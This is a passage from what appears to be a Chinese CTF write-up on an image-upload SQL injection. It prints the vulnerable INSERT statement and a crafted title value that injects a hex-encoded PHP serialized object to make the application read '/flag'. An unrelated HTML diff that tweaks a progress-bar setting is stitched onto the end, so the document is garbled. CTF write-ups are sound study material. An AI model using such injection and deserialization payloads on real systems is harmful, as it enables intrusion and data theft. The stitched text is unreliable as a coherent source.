 <p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p>
 <p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p>
@@ -494,7 +493,7 @@
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -520,8 +519,6 @@
 
 
 
-  
-    
   
 
 
